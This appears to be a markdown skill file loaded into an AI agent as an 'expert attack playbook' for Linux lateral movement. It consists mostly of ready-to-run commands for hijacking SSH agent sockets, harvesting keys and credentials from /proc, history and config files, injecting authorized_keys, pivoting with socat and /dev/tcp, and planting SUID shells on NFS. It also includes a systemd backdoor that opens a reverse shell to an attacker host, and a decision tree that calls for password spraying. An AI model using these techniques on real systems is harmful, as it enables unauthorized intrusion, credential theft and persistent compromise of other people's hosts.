---
name: linux-lateral-movement
description: >-
  Linux lateral movement playbook. Use after gaining initial access to pivot across Linux hosts via SSH hijacking, credential harvesting, internal pivoting, D-Bus exploitation, sudo token reuse, and shared filesystem abuse.
---

# SKILL: Linux Lateral Movement — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Linux lateral movement techniques. Covers SSH agent hijacking, key harvesting, credential locations, D-Bus exploitation, network pivoting, sudo token reuse, and systemd manipulation. Base models miss SSH_AUTH_SOCK hijacking and ptrace-based sudo session hijack.

## 0. RELATED ROUTING

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) if you need root before pivoting
- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target network includes containerized hosts
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when pivoting into a Kubernetes cluster
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting discovered internal services

---

## 1. SSH AGENT HIJACKING

### 1.1 Find SSH Agent Sockets

```bash
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n'
```

### 1.2 Hijack Agent Forwarding

```bash
export SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345
ssh-add -l         # list available keys
ssh -o StrictHostKeyChecking=no user@internal-host
```

### 1.3 Persistent Agent Monitoring

```bash
inotifywait -m /tmp -e create 2>/dev/null | grep ssh-
# Or poll:
while true; do
    find /tmp -path "*/ssh-*" -name "agent.*" -newer /tmp/.marker 2>/dev/null
    touch /tmp/.marker; sleep 5
done
```

---

## 2. SSH KEY HARVESTING

### 2.1 Private Key Locations

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

# Find keys without passphrase:
for key in $(find / -name "id_*" ! -name "*.pub" 2>/dev/null); do
    ssh-keygen -y -P "" -f "$key" > /dev/null 2>&1 && echo "NO PASSPHRASE: $key"
done
```

### 2.2 known_hosts Parsing

```bash
ssh-keygen -F 10.0.0.1 -f ~/.ssh/known_hosts
cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null \
  | awk '{print $1}' | tr ',' '\n' | sort -u
```

### 2.3 authorized_keys Injection

```bash
ssh-keygen -t ed25519 -f /tmp/pivot_key -N ""
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /root/.ssh/authorized_keys
ssh -i /tmp/pivot_key root@target
```

---

## 3. CREDENTIAL HARVESTING LOCATIONS

| Location | Contents |
|---|---|
| `/etc/shadow` | Password hashes |
| `.bash_history` | Command history (cleartext passwords) |
| `.mysql_history` / `.my.cnf` | MySQL credentials |
| `.pgpass` | PostgreSQL passwords |
| `.netrc` | FTP/HTTP auto-login credentials |
| `.git-credentials` | Git HTTPS passwords |

```bash
env | grep -iE "pass|key|secret|token|api|cred|auth"

for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret|token"
done

find /var/www /opt /srv -name "wp-config.php" -o -name "settings.py" \
     -o -name "*.env" -o -name "database.yml" 2>/dev/null
```

---

## 4. D-BUS EXPLOITATION

```bash
# List system bus services
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Introspect a service
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply \
  /org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect

# polkit actions available without auth:
pkaction --verbose 2>/dev/null | grep -B5 "implicit active: yes"
```

---

## 5. INTERNAL NETWORK PIVOTING

### 5.1 SSH Tunneling

```bash
ssh -L 3306:INTERNAL_HOST:3306 pivot@compromised   # local forward
ssh -R 8080:ATTACKER:8080 pivot@compromised         # remote forward
ssh -D 1080 pivot@compromised                       # SOCKS proxy
ssh -J user1@hop1,user2@hop2 target@final-host      # multi-hop
```

### 5.2 Without SSH

```bash
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80 &
ncat -l -p 8080 --sh-exec "ncat INTERNAL_HOST 80"
exec 3<>/dev/tcp/INTERNAL_HOST/80  # bash built-in, no tools needed

# chisel (SOCKS over HTTP):
# Server: chisel server -p 8080 --reverse
# Target: chisel client ATTACKER:8080 R:socks
```

### 5.3 Network Discovery

```bash
ss -tlnp && ss -tnp
arp -a && ip neigh

# Subnet sweep (bash-only):
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "ALIVE: 10.0.0.$i" & done; wait

# Port scan via /dev/tcp:
for port in 22 80 443 3306 5432 6379 8080; do
    (echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo "OPEN: $port"
done
```

---

## 6. SHARED FILESYSTEM EXPLOITATION

```bash
# NFS no_root_squash:
showmount -e FILESERVER_IP 2>/dev/null
mount -t nfs FILESERVER_IP:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash  # SUID on all mounting hosts

# SMB:
smbclient -L //FILESERVER_IP/ -N
mount -t cifs //FILESERVER_IP/share /mnt/smb -o username=user,password=pass
find /mnt/smb -name "*.kdbx" -o -name "*.conf" 2>/dev/null
```

---

## 7. SUDO TOKEN REUSE (ptrace-Based)

```bash
# Check active sudo tokens:
ls -la /var/run/sudo/ts/ 2>/dev/null

# sudo_inject: attach to user's shell process, inject sudo call
# The injected sudo inherits valid timestamp -> no password needed
# Tool: https://github.com/nongiach/sudo_inject
```

---

## 8. SYSTEMD SERVICE MANIPULATION

```bash
find /etc/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null
# Add ExecStartPre=/malicious/cmd or create new:
# [Service] Type=oneshot ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
systemctl daemon-reload && systemctl enable --now backdoor.service
```

---

## 9. LATERAL MOVEMENT DECISION TREE

```
Compromised host - where to move next?
|
|-- SSH credentials available?
|   |-- Private keys found? -> try on all known_hosts targets (S2)
|   |-- SSH agent running? -> hijack socket (S1)
|   |-- Passwords in history/configs? -> spray across hosts (S3)
|   +-- authorized_keys writable on other hosts? -> inject key (S2.3)
|
|-- Network services discovered?
|   |-- Internal web apps? -> tunnel + attack (S5.1)
|   |-- Databases (3306/5432/6379)? -> check harvested creds (S3)
|   |-- SMB/NFS shares? -> mount + search for creds/SUID (S6)
|   +-- Kubernetes API (6443)? -> load kubernetes-pentesting skill
|
|-- Root on current host?
|   |-- Read /etc/shadow -> crack hashes -> password reuse (S3)
|   |-- Dump /proc/*/environ -> find service credentials (S3)
|   +-- Hijack sudo tokens -> piggyback admin sessions (S7)
|
+-- No obvious path?
    |-- ARP scan + port sweep internal network (S5.3)
    |-- Wait for admin SSH -> agent hijack (S1.3)
    +-- Check for cloud metadata (169.254.169.254)
```
